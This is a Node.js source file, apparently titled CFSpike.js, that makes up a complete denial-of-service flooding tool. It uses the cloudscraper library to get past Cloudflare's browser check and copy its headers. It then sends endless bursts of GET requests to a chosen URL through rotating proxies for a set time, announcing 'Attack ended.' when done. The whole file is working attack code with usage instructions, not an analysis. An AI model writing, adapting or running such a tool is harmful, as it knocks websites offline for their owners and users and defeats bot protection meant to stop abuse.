/**
 * MIT License
 *
 * Copyright (c) 2020 Mrakovic
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

if (process.argv.length <= 5) {
	console.log(`Made by Tesla.
Usage: node CFSpike.js <url> <time> <threads_per_ip> <proxies>
Usage: node CFSpike.js <http://example.com> <60> <100> <http.txt>`);
    process.exit(-1);
}

let fs = require('fs'),
    CloudScraper = require('cloudscraper'),
    EventEmitter = require('events'),
    emitter = new EventEmitter(),
    target = process.argv[2],
    time = process.argv[3],
    threads = process.argv[4],
    proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

let getHeaders = new Promise(function (resolve, reject) {
    CloudScraper({
        uri: target,
        resolveWithFullResponse: true
    }, function (error, response) {
        if (error) {
            console.log(error.message);
            process.exit(-1);
        }
        resolve(response.request.headers);
    });
});


function send_req(headers) {
    let http = require("http"),
        proxy = proxies[Math.floor(Math.random() * proxies.length)],
        [ip, port] = proxy.split(':'),
        options = {
            host: ip,
            port: port,
            path: target,
            method: 'GET',
            headers: headers
        };

    for (let i = 0; i < threads; ++i) {
        let err = false;

        http.get(options, (res) => {
            // console.log(`STATUS: ${res.statusCode}`);
            // console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
        }).on('error', (e) => {
            console.log(`ERROR => ${proxy} (${e.code})`);

            //Delete array from object which have proxy value.
            if (e.code === 'ECONNRESET') {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                err = true;
            }
        });

        if (i > threads - 1) {
            return http.destroy();
        }

        if (err) {
            break;
        }
    }
}

getHeaders.then(function (result) {
    Object.keys(result).forEach(function (i, e) {
        console.log(i + ': ' + result[i]);
    });

    setInterval(() => {
        send_req(result);
    });
});

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(-1)
}, time * 1000);

// to avoid errors
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
